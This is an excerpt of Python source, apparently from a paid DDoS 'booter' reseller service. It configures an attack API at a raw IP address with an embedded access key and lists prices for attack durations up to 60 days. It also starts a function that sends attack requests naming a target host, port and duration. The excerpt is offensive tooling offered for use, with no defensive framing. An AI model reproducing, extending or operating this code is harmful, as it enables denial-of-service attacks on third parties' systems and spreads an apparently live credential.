...
API_LIST = [
    ...
    {
        "name": "Pro20N",
        "url": "http://54.163.45.50:5555/attack",
        "key": "xHeBSZx9Qipq0YgoxQqLoB7tBDy0zr75",
        "concurrent": 1,
        "max_time": 400,           
        "enabled": True,
        "timeout": 30
...
# Reseller pricing
RESELLER_PRICING = {
    '30m': {'price': 10, 'seconds': 30 * 60, 'label': '30 Minutes'}, 
    '1h': {'price': 20, 'seconds': 1 * 3600, 'label': '1 Hour'},
    '2h': {'price': 30, 'seconds': 2 * 3600, 'label': '2 Hour'},
    '6h': {'price': 40, 'seconds': 6 * 3600, 'label': '6 Hours'},
    '12h': {'price': 50, 'seconds': 12 * 3600, 'label': '12 Hours'},
    '1d': {'price': 70, 'seconds': 24 * 3600, 'label': '1 Day'},
    '3d': {'price': 170, 'seconds': 3 * 24 * 3600, 'label': '3 Days'},
    '7d': {'price': 320, 'seconds': 7 * 24 * 3600, 'label': '1 Week'},
    '30d': {'price': 1200, 'seconds': 30 * 24 * 3600, 'label': '1 Month'},
    '60d': {'price': 2300, 'seconds': 60 * 24 * 3600, 'label': '1 Season (60 Days)'}
}
...
def send_attack_via_api(api, target, port, duration):
    try:
        if api.get('method'):
            url = f"{api['url']}?key={api['key']}&host={target}&port={port}&time={duration}&method={api['method']}&concurrents=1"
        else:
